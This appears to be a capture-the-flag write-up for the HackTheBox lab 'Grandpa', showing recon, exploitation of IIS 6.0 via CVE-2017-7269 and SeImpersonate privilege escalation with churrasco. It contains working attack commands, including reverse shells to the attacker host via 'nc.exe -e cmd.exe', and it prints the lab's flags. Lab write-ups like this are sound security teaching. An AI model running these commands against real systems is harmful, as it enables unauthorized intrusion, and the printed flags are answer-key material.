# Grandpa - Easy

```shell
sudo vim /etc/hosts
#add grandpa.htb

nmap -T4 -p- -A -Pn -v grandpa.htb

gobuster dir -u http://grandpa.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

searchsploit microsoft iis 6.0
#we get exploits

nc -nvlp 4444

#run exploit
python cve-2017-7269.py grandpa.htb 80 10.10.14.4 4444

#this gives reverse shell
whoami

systeminfo
#copy output to file in attacker machine

#in attacker machine
vim sysinfo
#paste systeminfo

python2 windows-exploit-suggester.py --database 2022-11-13-mssb.xls --systeminfo sysinfo.txt

#in victim machine
#check privileges
whoami /priv

#churrasco exploit
#for file transfer

#in attacker machine
smbserver.py share .

#in victim machine
cd C:\Windows\Temp

copy \\10.10.14.4\share\nc.exe nc.exe

copy \\10.10.14.4\share\churrasco.exe ch.exe

#setup listener
nc -nvlp 5555

#run exploit
.\ch.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.4 5555"

#this gives reverse shell
whoami
#system user
#flags can be found in "Documents and Settings"
```

* Open ports & services:

  * 80 - Microsoft IIS httpd 6.0

* The webpage shows that it is 'Under Construction', so we can check for other directories.

* However, checking for other directories does not work as well because we get the message 'Directory Listing Denied'.

* So, we can use ```searchsploit``` to check for any exploits for ```Micrsoft IIS 6.0```, and we get many exploits.

* Googling gives similar results for CVE-2017-7269.

* On running the exploit, we get a reverse shell on our listener as 'network service' user.

* We can use ```windows-exploit-suggester``` to check for vulnerabilities.

* We can also check ```whoami /priv``` for privileges - this shows ```SeChangeNotify``` and ```SeImpersonate``` are enabled.

* Googling for 'windows server 2003 seimpersonateprivilege' give us results related to "token kidnapping" privesc exploits.

* This leads us to ```churrasco``` exploit; we can download the required files.

* Now, we need to transfer 'churrasco.exe' and 'nc.exe' (x86 system) to victim machine; this can be done using ```smbserver.py```

* Once we share both files, we can simply setup listener and run exploit to get shell as system user.

```markdown
1. User flag - bdff5ec67c3cff017f2bedc146a5d869

2. Root flag - 9359e905a2c35f861f6a57cecf28bb7b
```
